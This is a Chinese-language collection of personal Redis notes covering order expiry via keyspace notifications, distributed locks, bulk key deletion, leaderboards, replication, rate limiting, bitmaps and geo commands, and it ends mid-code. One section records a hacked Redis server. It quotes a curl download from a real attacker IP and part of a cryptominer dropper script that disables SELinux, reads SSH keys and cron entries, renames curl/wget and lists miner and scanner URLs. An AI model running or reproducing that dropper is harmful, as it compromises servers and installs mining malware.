## redis 记录
### 指定时间自动取消订单
```
1) 使用Linux内置的crontab定时任务，每隔几秒甚至几分钟轮训遍历一次数据库，找到超出时间间隔的订单，进行取消。这种办法没有失效性以及在没有订单的时间内属于浪费服务器资源。

2) 使用框架内置的延时处理机制。比如Laravel的队列任务，可以指定多少分钟后执行。这样就能判断订单是否超出时间间隔，是否要取消订单恢复库存量。

3) 使用Redis的keyspace notification（键空间通知）。Redis可以设置一个key到多久时间后过期,比如:SETEX name 123 20,设置name在20秒后过期。此时，过期会触发事件发布，所有redis客户端都会订阅，获得相关信息。
//https://www.guaosi.com/2019/02/25/automatically-cancel-the-order/
vim usr/local/etc/redis/redis.conf
notify-keyspace-events "Ex"
service redis-server restart /usr/local/etc/redis/redis.conf
会监听0号库所有过期的key
redis-cli
psubscribe __keyevent@0__:expired 监听0号库所有过期的key
setex name 5 guaosi
5秒后，原终端会输出如下

1) "pmessage"
2) "__keyevent@0__:expired"
3) "__keyevent@0__:expired"
4) "name"
class MRedis
{

    private $redis;

    /**
     * 构造函数
     *
     * @param string $host 主机号
     * @param int $port 端口号
     */
    public function __construct($host = 'redis', $port = 6379)
    {
        $this->redis = new redis();
        $this->redis->connect($host, $port);
    }

    public function expire($key = null, $time = 0)
    {
        return $this->redis->expire($key, $time);
    }
    public function psubscribe($patterns = array(), $callback)
    {
        $this->redis->psubscribe($patterns, $callback);
    }

    public function setOption()
    {
        $this->redis->setOption(Redis::OPT_READ_TIMEOUT, -1);
    }
}
//变量$msg就是过期的key的名称，我们只能获取到key的名称，不能获得到原来设置的值。
function callback($redis, $pattern, $chan, $msg)
{
    // 回调函数,这里写处理逻辑
    echo "Pattern: $pattern\n";
    echo "Channel: $chan\n";
    echo "Payload: $msg\n";
}

$redis = new MRedis();
//redis会有默认连接时间，对 redis客户端进行一些参数设置，使读取超时参数 为 -1，表示不超时。
$redis->setOption();
//这里输入订阅，以及订阅成功后触发的函数名
//监听库为0里的过期key
$redis->psubscribe(array('__keyevent@0__:expired'), 'callback');
php test.php

larvel config/database.php
'redis' => [
         'client' => 'predis',
         'default' => [
             'host' => env('REDIS_HOST', '127.0.0.1'),
             'password' => env('REDIS_PASSWORD', null),
             'port' => env('REDIS_PORT', 6379),
             'database' => env('REDIS_DATABASE', 0),
             'persistent' => true, // 开启持久连接
             'read_write_timeout' => 0,
             //据Predis作者在配置文件中说明
             //因为在底层网络资源上执行读取或写入操作时使用了超时，默认设置了timeout 为60s。
             //到60s自动断开并报错.设置成0可以解决这个问题。
         ],

     ],
class OrderController extends Controller{
    //创建用户订单
    public function store(Request $request)
    {
        //这里是接收到用户传来的下单信息，存入数据库后，返回一个订单id
        //我们让返回的订单ID为2019
        $order_id = 2019;
        //因为一个项目中可能会有很多使用到setex的地方，所以给订单id加个前缀
        $order_prefix_id = 'order_'.$order_id;
        //将订单ID存入redis缓存中，并且设置过期时间为5秒
        $key_name = $order_prefix_id; //我们在订阅中只能接收到$key_name的值
        $expire_second = 5; //设置过期时间，单位为秒
        $value = $order_id;
        Redis::setex($key_name,$expire_second,$value);
        echo "设置过期key=".$order_prefix_id."成功";
    }
}

public function handle()
    {
        //项目中有可能用的redis不是0，所以这里用env配置里面获取的
        $publish_num=env('REDIS_DATABASE', 0);
        Redis::psubscribe(['__keyevent@'.$publish_num.'__:expired'], function ($message, $channel) {
            //$message 就是我们从获取到的过期key的名称
            $explode_arr=explode('_',$message);
            $prefix=$explode_arr[0];
            if($prefix=='order'){
                $order_id=$explode_arr[1];
                echo $order_id;
                //这里就是编写过期的订单，过期后要如何处理的业务逻辑
                //TODO
            }
        });
    }
   监听处理程序只要一台处理，把监听处理的过程改一下，取出订单 ID 之后不要去处理，通过 rpush 放到一个 redis 的队列里去。另外起几台服务器，连到这个 redis 服务器，通过 blpop 接收消息队列里出来的订单 ID。这样，多台机器可以同时工作，一个订单只会从 blpop 里出来一次，不会重复执行，多台机器可以分担任务，又互不影响。消息队列也可以换成业界成熟的 rabbitmq 、 kafka 之类的专业消息队列，那又是另外一个话题了。反正业务量大了，变复杂了，消息总线跑不掉，天猫京东也差不多如此https://learnku.com/articles/21488

    使用 zset 比利用 redis 的大 key set 这样的形式，节约一些空间占用，定时任务处理方面，可以使用 swoole 的 swoole_timer_tick 全都是内存级的操作，会提升很多效率。https://alpha2016.github.io/2019/02/24/%E5%80%9F%E5%8A%A9Swoole%E5%AE%9A%E6%97%B6%E8%BF%87%E6%9C%9F%E6%9C%AA%E6%94%AF%E4%BB%98%E8%AE%A2%E5%8D%95/
    借助 redis 的 zset 有序集合，订单产生的时候，zadd orders timestamp orderid 将 orderid 保存到对应的 orders 集合中，以时间戳作为他的 score 分值，存储部分是这样的，简单 + 占用空间内存极小。读取部分： 在 swoole 启动时，设置定时器，每分钟去 orders set 中读取设置的时间之前的数据，个人为了测试方便，设置的读取前一分钟到前三十分钟内的数据。获取到数据之后，根据业务逻辑处理数据，然后 zrem orders orderid 命令从集合中移除对应的 orderid。个人以为这个方案是内存占用和效率兼具的一个方案

    <?php
    $server = new swoole_websocket_server("0.0.0.0", 9502);

    // 在定时器中使用协程需要增加此项配置
    $server->set(
        [
            'enable_coroutine' => true
        ]
    );

    $server->on('workerStart', function ($server, $workerId) {
        $redis = new Swoole\Coroutine\Redis();
        $redis->connect('127.0.0.1', 6379);

        // tick 为持续触发的定时器
        swoole_timer_tick(10000, function() use ($redis) {
            $upperLimitTime = strtotime('-1 minute');
            $lowerLimitTime = strtotime('-30 minute');
            echo '上限时间:' . $upperLimitTime . '下限时间:' . $lowerLimitTime;
            $result = $redis->zrangebyscore('orders', $lowerLimitTime, $upperLimitTime);
            var_dump($result);

            // 根据查询到的 id 进行业务处理，然后 zrem orders orderid 移除处理成功的 orderid
        });
    });

    $server->on('message', function (swoole_websocket_server $server, $request) {
        $server->push($request->fd, "hello");
    });

    $server->start();
```
### 数据类型不一致
```
两处使用了一个 zSets，一处是从网页获取数据，放到 zSets 里面；另一处是从数据库获取数据放到 zSets 里面。在后期做清除数据操作的时候，发现了数据清除的不完全，后来仔细的检查了一下。发现数据重复。
https://www.h57.pw/2016/09/20/redis-zsets-data-type-inconsistency/
仔细测试了好一会儿之后，才发现了问题坐在，就是当 score 相同的时候，相同的 value 会覆盖数据，这里的 value 相同，并不仅仅是值相同，而且数据类型也应该一致才会覆盖。否则就会产生 score 相同的两条数据。
```
### Redis 被黑
```
https://learnku.com/laravel/t/28411
MISCONF Redis is configured to save RDB snapshots, but it is currently not able to persist on disk. Commands that may modify the data set are disabled, because this instance is configured to report errors during writes if RDB snapshotting fails (stop-writes-on-bgsave-error option). Please check the Redis logs for details about the RDB error.
之后通过 127.0.0.1:6379> config set stop-writes-on-bgsave-error no 命令解决了问题
执行 curl -fsSL http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/init.sh 等命令得了一些脚本
#!/bin/sh
setenforce 0 2>dev/null
echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
sync && echo 3 >/proc/sys/vm/drop_caches
crondir='/var/spool/cron/'"$USER"
cont=`cat ${crondir}`
ssht=`cat /root/.ssh/authorized_keys`
echo 1 > /etc/sysupdates
rtdir="/etc/sysupdates"
bbdir="/usr/bin/curl"
bbdira="/usr/bin/cur"
ccdir="/usr/bin/wget"
ccdira="/usr/bin/wge"
mv /usr/bin/wget /usr/bin/get
mv /usr/bin/xget /usr/bin/get
mv /usr/bin/get /usr/bin/wge
mv /usr/bin/curl /usr/bin/url
mv /usr/bin/xurl /usr/bin/url
mv /usr/bin/url /usr/bin/cur
miner_url="https://pixeldrain.com/api/download/Y0o4foA1"
miner_url_backup="http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/sysupdate"
miner_size="854364"
sh_url="http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/update.sh"
sh_url_backup="http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/update.sh"
config_url="http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/config.json"
config_url_backup="http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/config.json"
config_size="3300"
scan_url="https://pixeldrain.com/api/download/OMKMU5Td"
scan_url_backup="http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/networkservice"
scan_size="2584064"

https://www.freebuf.com/vuls/148758.html  查看线上环境是否使用了 redis-weui 了
```

### 加锁和解锁问题
```
if ($redis->set('my:lock', 1, ['NX'])) {
        # todo

        $redis->del('my:lock');
    }
其中NX — 表示只有key不存在的时候才设置https://shuwoom.com/?p=2833
if ($redis->set('my:lock', 1, ['NX', 'EX' => 10])) {
        # todo

        $redis->del('my:lock');
    }

    原子性问题而面临上面同样的问题。所以这里要用到lua脚本来解决。

        $script = '
    if redis.call("get",KEYS[1]) == ARGV[1]
    then
        return redis.call("del",KEYS[1])
    else
        return 0
    end
        ';
        $token = uniqid(mt_rand(), true);
        if ($redis->set('my:lock', $token, ['NX', 'EX' => 10])) {
            # todo

            $redis->eval($script, ["my:lock", $token], 1);
        } else {
            echo 'get lock failed!';
        }
```
### 批量删除redis的key
```
redis-cli -h host -p 6379 -a pwd -n 15 --scan --pattern 'exchange*' | xargs -0 -n 5000 redis-cli -h host -a pwd -p 6379 -n 15 DEL
-h 你的redis服务器地址
-p 端口 默认6379
-a 密码
-n 选择redis对应的db

xargs参数:
-n 按每n个为一组输出参数，如果redis的Key数量大的话可以增加此参数,否则会报错 argument list too long
-0 当key还有引号等特殊字符,加此参数可以屏蔽,使特殊字符失效,不加会报错:
https://segmentfault.com/a/1190000016717860
每次扫10条 redis-cli  --scan --pattern 'app:uid:reg:date:707*'|xargs -n 10 redis-cli mget

登录redis通过info查看，内存使用25G多，而KEY也有1.44亿了。。。REIDS中有大量无用而又未设置过期时间的KEY存在。设置个过期时间，举手之劳的事，还是有必要的。

used_memory_human:24.72G
db0:keys=144856453,expires=25357
通过测试机执行 keys prefix* 导致REDIS卡死，其他连接也连不上。所以定位到问题出现在keys命令上，也正如手册上说的造成性能问题。

如何删除未用到的KEY？

大部分KEY是有规律的，有特定前缀，需要拿到特定前缀的KEY然后删除，网上有这样的命令：

redis-cli -a redis-pwd -n 0 keys "preffix*" | xargs redis-cli -p 6379 -a redis-pwd -n 0 del
测试机执行keys “preffix-1*“时间大概40多s，这意味着redis要停40s+，而前缀是按天设置的，这样子需要操作多次，因为业务的原因，不允许这么操作，分分钟都是钱~最后想到的办法是先从测试机上把满足条件的key导到文本，前面的语句通过cat文本去拿。如：

redis-cli -p 6380 -a redis-pwd keys "preffix-1*" > /home/keys_redis/preffix-1
然后通过这些数据删掉生产环境上的key。

cat /home/keys_redis/preffix-1 | xargs redis-cli -a redis-pwd -n 0 del
删除的速度非常快，内存耗的也挺快，感觉像是有多少耗多少的。执行之后KEY的数量减少了95%+，内存也从25G降到了2G。不过有一个指数升高：mem_fragmentation_ratio，前后的memory对比：

# Memory 处理前
used_memory:26839186032
used_memory_human:25.00G
used_memory_rss:23518339072
used_memory_peak:26963439000
used_memory_peak_human:25.11G
used_memory_lua:31744
mem_fragmentation_ratio:0.88
mem_allocator:jemalloc-3.2.0

# Memory 处理后
used_memory:2399386704
used_memory_human:2.23G
used_memory_rss:4621533184
used_memory_peak:26963439000
used_memory_peak_human:25.11G
used_memory_lua:31744
mem_fragmentation_ratio:1.93
mem_allocator:jemalloc-3.2.0

https://itopic.org/redis-delete-keys.html

<?php

$redis = new Redis();
//设置扩展在一次scan没有查找出记录时 进行重复的scan 直到查询出结果或者遍历结束为止
$redis->setOption(Redis::OPT_SCAN, Redis::SCAN_RETRY);

$match = 'foo:*';
$count = 10000;
$it=null;

//这种用法下我们只需要简单判断返回结果是否为空即可, 如果为空说明遍历结束
while ($keys = $redis->scan($it, $match, $count)) {
    $redis->del($keys);
}

?>
在删除的同时注意监控内存变化情况，就能确认问题了：

shell> watch -d -n 1 '/path/to/redis-cli info | grep memory'

/* 设置遍历的特性为不重复查找，该情况下扩展只会scan一次，所以可能会返回空集合 */
$redis->setOption(Redis::OPT_SCAN, Redis::SCAN_NORETRY);

$it = NULL;
$pattern = '*';
$count = 50;  // 每次遍历50条，注意是遍历50条，遍历出来的50条key还要去匹配你的模式，所以并不等于就能够取出50条key

do
{
    $keysArr = $redis->scan($it, $pattern, $count);

    if ($keysArr)
    {
        foreach ($keysArr as $key)
        {
            echo $key . "\n";
        }
    }

} while ($it > 0);   //每次调用 Scan会自动改变 $it 值，当$it = 0时 这次遍历结束 退出循环




https://blog.csdn.net/zhang197093/article/details/74615717
https://blog.huoding.com/2014/04/11/343
```
### 有序集合实现 24 小时排行榜实时更新
```
利用 ZADD 按小时划分添加用户的积分信息，然后用 ZUNIONSTORE 并集实现 24 小时的游戏积分总和，实现 “24 小时排行榜”；

   ZUNIONSTORE destination numkeys key [key ...]
    Redis Zunionstore 命令计算给定的一个或多个有序集的并集，其中给定 key 的数量必须以 numkeys 参数指定，并     将该并集(结果集)储存到 destination 。
    默认情况下，结果集中某个成员的分数值是所有给定集下该成员分数值之和 。

    Redis 在遇到分数相同时是按照集合成员自身的字典顺序来排序，这里即是按照”user2″和”user3″这两个字符串进行排序，以逆序排序的话 user3 自然排到了前面。要解决这个问题，我们可以考虑在分数中加入时间戳，计算公式为：
    带时间戳的分数 = 实际分数*10000000000 + (9999999999 – timestamp)
    https://learnku.com/articles/30279
```
### 主从配置
```
cp /usr/local/redis/redis.conf /usr/local/redis/redis.6380.conf

[root@localhost redis]# vim /etc/redis/redis.conf
bind 0.0.0.0 # 绑定允许访问的ip地址，如本机模拟主从可不改变值仍使用127.0.0.1

[root@localhost redis]# vim /usr/local/redis/redis.6380.conf
port 6380 # 将端口更改为6380
slaveof 127.0.0.1 6379 # 指定master ip port

[root@localhost redis]# redis-server /usr/local/redis/redis.conf # 启动master
[root@localhost redis]# redis-server /usr/local/redis/redis.6380.conf # 启动slave
查看 Master 状态

[liubo@localhost ~]$ redis-cli -p 6379
127.0.0.1:6379> info
# Server
……
# Clients
……
# Memory
……
# Persistence
……
# Stats
……
# Replication # 关注此区域
role:master # 当前角色,master
connected_slaves:1 # 已连接slave：1个
slave0:ip=127.0.0.1,port=6380,state=online,offset=56,lag=1 # slave0信息
master_replid:7e3b0e1accd31abaf58177160685d51952ea1e90
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:56
second_repl_offset:-1
repl_backlog_active:1
repl_backlog_size:1048576
repl_backlog_first_byte_offset:1
repl_backlog_histlen:56
# CPU
……
# Cluster
……
查看 Slave 状态

[liubo@localhost ~]$ redis-cli -p 6380
127.0.0.1:6379> info
# Server
……
# Clients
……
# Memory
……
# Persistence
……
# Stats
……
# Replication # 关注此区域
role:slave # 当前角色,slave
master_host:127.0.0.1 # master相关信息
master_port:6379
master_link_status:up # 连接master状态
master_last_io_seconds_ago:4
master_sync_in_progress:0
slave_repl_offset:84
slave_priority:100
slave_read_only:1
connected_slaves:0
master_replid:7e3b0e1accd31abaf58177160685d51952ea1e90
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:84
second_repl_offset:-1
repl_backlog_active:1
repl_backlog_size:1048576
repl_backlog_first_byte_offset:1
repl_backlog_histlen:84
# CPU

https://learnku.com/index.php/articles/30765
```
### 分布式锁
```
$redis = new Redis();
$redis->connect('127.0.0.1', 6379);
$ok = $redis->setNX($key, $value);
if ($ok) {
    //获取到锁
    ... do something ...
    $redis->del($key);
}

$redis->multi();
$redis->setNX($key, $value);
$redis->expire($key, $ttl);
$res = $redis->exec();
if($res[0]) {
    //获取到锁
    ... do something ...
    $redis->del($key);
}
$script = <<<EOT
    local key   = KEYS[1]
    local value = KEYS[2]
    local ttl   = KEYS[3]

    local ok = redis.call('setnx', key, value)

    if ok == 1 then
    redis.call('expire', key, ttl)
    end
    return ok
EOT;

$res = $redis->eval($script, [$key,$val, $ttl], 3);
if($res) {
    //获取到锁https://learnku.com/articles/30827
    ... do something ...
    $redis->del($key);
}

$ok = $redis->set($key, $random, array('nx', 'ex' => $ttl));

if ($ok) {
    //获取到锁
    ... do something ...
    if ($redis->get($key) == $random) {
        $redis->del($key);
    }
}


引入了一个随机数，这是为了防止逻辑处理时间过长导致锁的过期时间已经失效，这时候下一个请求就获得了锁，但是前一个请求在逻辑处理完直接删除了锁。

锁主要用在并发请求如秒杀等场景中，以上便是 redis 锁的实现。
```
### 异步消息队列与延时队列
```
$redis = new Redis();
$redis->connect('127.0.0.1', 6379);

//发送消息
$redis->lPush($list, $value);

//消费消息
while (true) {
    try {
        $msg = $redis->rPop($list);
        if (!$msg) {
            sleep(1);
        }
        //业务处理

    } catch (Exception $e) {
        echo $e->getMessage();
    }
}

blpop/brpop在队列没有数据的时候，会立即进入休眠状态，一旦数据到来，则立刻醒过来。消息的延迟几乎为零。用blpop/brpop替代前面的lpop/rpop，就完美解决了上面的问题。
将有序集合的value设置为我们的消息任务，把value的score设置为消息的到期时间，然后轮询获取有序集合的中的到期消息进行处理。
实现代码如下：
$redis = new Redis();
$redis->connect('127.0.0.1', 6379);

$redis->zAdd($delayQueue,$tts, $value);

while(true) {
    try{
        $msg = $redis->zRangeByScore($delayQueue,0,time(),0,1);
        if(!$msg){
            continue;
        }
        //删除消息
        $ok = $redis.zrem($delayQueue,$msg);
        if($ok){
            //业务处理
        }
    } catch(\Exception $e) {

    }
}
https://learnku.com/articles/30826
HyperLogLog 算法是一种非常巧妙的近似统计海量去重元素数量的算法。它内部维护了 16384 个桶（bucket）来记录各自桶的元素数量。当一个元素到来时，它会散列到其中一个桶，以一定的概率影响这个桶的计数值。因为是概率算法，所以单个桶的计数值并不准确，但是将所有的桶计数值进行调合均值累加起来，结果就会非常接近真实的计数值。

pfadd 增加计数
pfcount 获取计数
HyperLogLog 还提供了第三个指令 pfmerge，用于将多个 pf 计数值累加在一起形成一个新的 pf 值。

比如在网站中我们有两个内容差不多的页面，运营需要将两个页面的数据进行合并。其中页面的 UV 访问量也需要合并，这时候就可以使用 pfmerge
布隆过滤器可以理解为一个不怎么精确的 set 结构
> docker pull redislabs/rebloom # 拉取镜像
> docker run -p 6379:6379 redislabs/rebloom # 运行容器
> redis-cli # 连接容器中的 redis 服务
bf.add 添加元素
bf.exists 查询元素是否存在
bf.madd 一次添加多个元素
bf.mexists 一次查询多个元素是否存在

主要是解决大规模数据下不需要精确过滤的场景，如检查垃圾邮件地址，爬虫 URL 地址去重，解决缓存穿透问题等。
```
### geo
```
添加杭州北京上海的地理位置
127.0.0.1:6379> geoadd city 120.20000 30.26667 hangzhou  116.41667 39.91667 beijing 121.47 31.23 shanghai
geopos 指令可以获取集合中任意元素的经纬度坐标，可以一次获取多个。

127.0.0.1:6379> geopos city hangzhou  beijing shanghai
1) 1) "120.15000075101852417"
   2) "30.2800007575645509"
2) 1) "116.39999896287918091"
   2) "39.90000009167092543"
3) 1) "121.47000163793563843"
   2) "31.22999903975783553"
127.0.0.1:6379> geopos city hangzhou
1) 1) "120.15000075101852417"
   2) "30.2800007575645509"
计算距离

距离单位可以是 m、km、ml、ft，分别代表米、千米、英里和尺。

127.0.0.1:6379> geodist city shanghai hangzhou  km
"164.5694"
127.0.0.1:6379> geodist city beijing  hangzhou  km
"1122.7998"

例如查找距离杭州300km以内的城市的10个城市按距离排序

127.0.0.1:6379> GEORADIUSBYMEMBER city hangzhou 300 km WITHCOORD WITHDIST WITHHASH  ASC COUNT 10
1) 1) "hangzhou"
   2) "0.0000"
   3) (integer) 4054134257390783
   4) 1) "120.15000075101852417"
      2) "30.2800007575645509"
2) 1) "shanghai"
   2) "164.5694"
   3) (integer) 4054803462927619
   4) 1) "121.47000163793563843"
      2) "31.22999903975783553"
在给定以下可选项时， 命令会返回额外的信息：

WITHDIST ： 在返回位置元素的同时， 将位置元素与中心之间的距离也一并返回。 距离的单位和用户给定的范围单位保持一致。
WITHCOORD ： 将位置元素的经度和维度也一并返回。
WITHHASH ： 以 52 位有符号整数的形式， 返回位置元素经过原始 geohash 编码的有序集合分值。
ASC ： 根据中心的位置， 按照从近到远的方式返回位置元素。DESC ： 根据中心的位置， 按照从远到近的方式返回位置元素。
获取元素的 hash 值

可能你还注意到有一个命令 GEOHASH, 那他是做什么的呢

127.0.0.1:6379> geohash city hangzhou
1) "wtmkq069cc0"
127.0.0.1:6379> geohash city beijing
1) "wx4fbxxfke0"
返回的其实是元素的经纬度经过 goehash 计算后的 base32 编码字符串

http://geohash.org/wtmkq069cc0  进行直接定位
其存储结构主要使用的是 Redis 的有序结构，其 score 是 GeoHash 的 52 位整数值

127.0.0.1:6379> ZRANGE city 0 -1 WITHSCORES
1) "hangzhou"
2) "4054134257390783"
3) "shanghai"
4) "4054803462927619"
5) "beijing"
6) "4069885360207904"
```
### 限流
```
在高并发场景下有三把利器保护系统：缓存、降级、和限流。缓存的目的是提升系统的访问你速度和增大系统能处理的容量；降级是当服务出问题或影响到核心流程的性能则需要暂时屏蔽掉。而有些场景则需要限制并发请求量，如秒杀、抢购、发帖、评论、恶意爬虫等。

限流算法
常见的限流算法有：计数器，漏桶、令牌桶。
function isActionAllowed($userId, $action, $period, $maxCount)
{
    $redis = new Redis();
    $redis->connect('127.0.0.1', 6379);
    $key = sprintf('hist:%s:%s', $userId, $action);
    $now = msectime();   # 毫秒时间戳

    $pipe=$redis->multi(Redis::PIPELINE); //使用管道提升性能
    $pipe->zadd($key, $now, $now); //value 和 score 都使用毫秒时间戳
    $pipe->zremrangebyscore($key, 0, $now - $period); //移除时间窗口之前的行为记录，剩下的都是时间窗口内的
    $pipe->zcard($key);  //获取窗口内的行为数量
    $pipe->expire($key, $period + 1);  //多加一秒过期时间
    $replies = $pipe->exec();
    return $replies[2] <= $maxCount;
}
for ($i=0; $i<20; $i++){
    var_dump(isActionAllowed("110", "reply", 60*1000, 5)); //执行可以发现只有前5次是通过的
}

//返回当前的毫秒时间戳
function msectime() {
    list($msec, $sec) = explode(' ', microtime());
    $msectime = (float)sprintf('%.0f', (floatval($msec) + floatval($sec)) * 1000);
    return $msectime;
 }
```
### redis 删除大key集合的方法
```
import redis

def test():
    # StrictRedis创建连接时，这个连接由连接池管理，所以我们无需关注连接是否需要主动释放http://www.ikeguang.com/2019/03/14/redis-del-security/
	re = redis.StrictRedis(host = "0.0.0.0",port = 6379,password = "123")
	key = "test"
	for i in range(100000):
		re.sadd(key, i)

	cursor = '0'
	cou = 200
	while cursor != 0:
		cursor,data = re.sscan(name = key, cursor = cursor, count = cou)
		for item in data:
			re.srem(key, item)
		print cursor
```
### 删除redis中过时的key
```
#!/usr/bin/python
# -*- coding:utf-8 -*-

# 需要手动删除redis中某一天产生的key

import sys
import commands

# 执行 shell 命令
def execCmd(cmd):
	print cmd
	return commands.getstatusoutput(cmd)

if __name__ == '__main__':
	args = sys.argv
	if len(args) != 4:
		print 'please input correct cmd argument, like python /home/hadoop/scripts/rediskey.py 2018-08-01 port passwd'
		sys.exit(1)
	date = args[1]
	port = args[2]
	passwd = args[3]
	keyPath = '/home/hadoop/scripts/rediskey.txt'
	cmd = '/app/local/redis-3.2.11/src/redis-cli -h 0.0.0.0 -p %s -a %s keys *%s* > %s'%(port, passwd, date, keyPath)
	(status,result) = execCmd(cmd)
	if status == 0:
		with open(keyPath) as f:
			line = f.readline()
			while line:
				key = line.strip()
				cmd = '/app/local/redis-3.2.11/src/redis-cli -h 0.0.0.0 -p %s -a %s del %s'%(port, passwd, key)
				(status,result) = execCmd(cmd)
				if status == 0:
					print 'del key %s success'%(key)
				else:
					print 'del key %s failed...'%(key)
					print result
				line = f.readline()
	else:
		print result
	print 'redis %s key delete finished...'%(date)
调用这个脚本，只需要输入命令：python /home/hadoop/scripts/rediskey.py '2018-08-01' 6379 '123456'
四个参数：

脚本名：/home/hadoop/scripts/rediskey.py
要清理的日期：2018-08-01
端口：6379
host：123456
基本思想就是模糊匹配redis的key，保存到一个文件，然后读取文件每一行，删除key即可。
http://www.ikeguang.com/2018/08/28/delete-redis-key/
```
### redis总结
```
redis中的键的生存时间
expire  设置生存时间（单位/秒）
expire key seconds(秒)

ttl 查看键的剩余生存时间
ttl key

persist 取消生存时间
persist key

expireat指定时刻过期
expireat key unix时间戳
expireat key 1551858600
一组redis命令要么都执行，要么都不执行。
原理：先将属于一个事务的命令发送给redis进行缓存，最后再让redis依次执行这些命令。

应用场景：
一组命令必须同时都执行，或者都不执行。
我们想要保证一组命令在执行的过程之中不被其它命令插入。
multi    //事务开始
.....
exec     //事务结束，开始执行事务中的命令
discard     //放弃事务
正因为redis不支持回滚功能，才使得redis在事务上可以保持简洁和快速。
redis持久化指把数据持久化到磁盘，便于故障恢复，redis支持两种方式的持久化，可以单独使用或者结合起来使用。

第一种：RDB方式（redis默认的持久化方式）
第二种：AOF方式
edis持久化之RDB

rdb方式的持久化是通过快照完成的，当符合一定条件时redis会自动将内存中的所有数据执行快照操作并存储到硬盘上。默认存储在dump.rdb文件中。(文件名在配置文件中dbfilename)

redis进行快照的时机（在配置文件redis.conf中）

 http://www.ikeguang.com/2018/12/12/redis-usage/
save 900 1  //表示900秒内至少一个键被更改则进行快照。
save 300 10  //表示300秒内10条被更改则快照
save 60 10000  //60秒内10000条
Redis自动实现快照的过程

1、redis使用fork函数复制一份当前进程的副本(子进程)
2、父进程继续接收并处理客户端发来的命令，而子进程开始将内存中的数据写入硬盘中的临时文件
3、当子进程写入完所有数据后会用该临时文件替换旧的RDB文件，至此，一次快照操作完成。
注意：快照时，要保证内存还有一半空间。
rdb的优缺点

优点：由于存储的有数据快照文件，恢复数据很方便。
缺点：会丢失最后一次快照以后更改的所有数据。

redis持久化之AOF

把写操作指令，持续的写到一个类似日志文件里。

由于写操作指令保存在日志文件里，异常恢复时把文件里面所有指令执行一遍即可。如果你执行了flushall命令，清空了redis，而你采用的aof持久化方式，那么，就可以找到这个文件，将最后一行flushall删掉，执行恢复命令，将命令全部执行一遍，这样数据就恢复了。
AOF 的默认策略为每秒钟 fsync 一次，在这种配置下，Redis 仍然可以保持良好的性能，并且就算发生故障停机，也最多只会丢失一秒钟的数据（ fsync 会在后台线程执行，所以主线程可以继续努力地处理命令请求）。

对于相同的数据集来说，AOF 文件的体积通常要大于 RDB 文件的体积。根据所使用的 fsync 策略，AOF 的速度可能会慢于 RDB 。
Redis 的 bit 可以用于实现比 set 内存高度压缩的计数，它通过一个 bit 1 或 0 来存储某个元素是否存在信息。例如网站唯一访客计数，可以把 user_id 作为 bit 的偏移量 offset，设置为 1 表示有访问，使用 1 MB的空间就可以存放 800 多万用户的一天访问计数情况。
SETBIT key offset value  # 设置位信息 setbit users 123 1
GETBIT key offset        # 获取位信息
BITCOUNT key [start end] # 计数
BITOP operation destkey key [key ...]  # 位图合并
基于 bit 的方法比起 set 空间消耗小得多，但是它要求元素能否简单映射为位偏移，适用面窄了不少，另外它消耗的空间取决于最大偏移量，和计数值无关，如果最大偏移量很大，消耗内存也相当可观。

数据在【从服务器】里【读】，在【主服务器】里【写】。
数据库分为两类，一类是主数据库（master），另一类是从数据库[1] （slave）。主数据库可以进行读写操作，当写操作导致数据变化时会自动将数据同步给从数据库。而从数据库一般是只读的，并接受主数据库同步过来的数据。一个主数据库可以拥有多个从数据库，而一个从数据库只能拥有一个主数据库。
SETBIT video:1201 200 1
# 上面的命令就是设置ID为200的用户，已经看过了ID为1201的视频。
GETBIT video:1201 200
# 上面的命令就是查询ID为200的用户是否观看了ID为1201的视频
https://www.zhihu.com/question/27672245
>set zhihu "www.zhihu.com"
>bitcount zhihu
61
$str = "www.zhihu.com";
for($i = 0;$i<strlen($str);$i++) {
	$bin .= sprintf("%08b", ord($str[$i]));
}
echo ($bin); #01110111011101110111011100101110011110100110100001101001011010000111010100101110011000110110111101101101
echo array_sum(str_split($bin, 1)); #61

 >set andy a
 >setbit andy 6 1
 >setbit andy 7 0
 >get andy
 b
 BITCOUNT 就是统计字符串的二级制码中，有多少个'1'。 所以在这里，

 BITCOUNT andy 得到的结果就是 3 啦。

'a' 的ASCII码是  97。转换为二进制是：01100001。offset的学名叫做“偏移” 。二进制中的每一位就是offset值啦，比如在这里  offset 0 等于 ‘0’ ，offset 1等于'1' ,offset2等于'1',offset 7 等于'1' ，没错，offset是从左往右计数的，也就是从高位往低位。我们通过SETBIT 命令将 andy中的 'a' 变成 'b' 应该怎么变呢？也就是将 01100001 变成 01100010 （b的ASCII码是98），这个很简单啦，也就是将'a'中的offset 6从0变成1，将offset 7 从1变成0 。

 bitcount key startOffset endOffset

 key：键值

 startOffset：起始偏移量（注意：这个偏移量是以字节为单位的）

 endOffset：结束偏移量（注意：这个偏移量同样是以字节为单位的）
```
### 签到
```
$dayKey = 'login:'.\date('Ymd',\time());
$redis->setbit($dayKey, $this->user->id, 1);
$redis->bitop('AND', 'threeAnd', 'login:20190311', 'login:20190312', 'login:20190313');
echo "连续三天都签到的用户数量：" . $redis->bitCount('threeAnd');

$redis->bitop('OR', 'threeOr', 'login:20190311', 'login:20190312', 'login:20190313');
echo "三天中签到用户数量（有一天签也算签了）：" . $redis->bitCount('threeOr');

$redis->bitop('AND', 'monthActivities'', $redis->keys('login:201903*'));
echo "连续一个月签到用户数量：" . $redis->bitCount('monthActivities');

echo "当前用户指定天数是否签到：" . $redis->getbit('login:20190311', $this->user->id);
https://learnku.com/articles/25181
$redis->scan(0, 'match', 'login:201903*', 'count', 1000))
COUNT 参数的默认值为 10 ，如果不是 0 ，你再使用 scan 3 match login:201903* 继续遍历。
```
### Redis 分布式存储
```
class RedisCluster {
    public $servers = array();

    public function addServer($host, $port) {
        $redis = new Redis();
        $redis->_connected = false;
        $redis->_host = $host;
        $redis->_port = $port;
        $this->servers[] = $redis;
    }

    public function __call($method, $args) {
        if (!method_exists("Redis", $method)) {
            throw new Execption("not method");
        }
        $redis = $this->servers[abs(crc32($args[0])) % count($this->servers)];
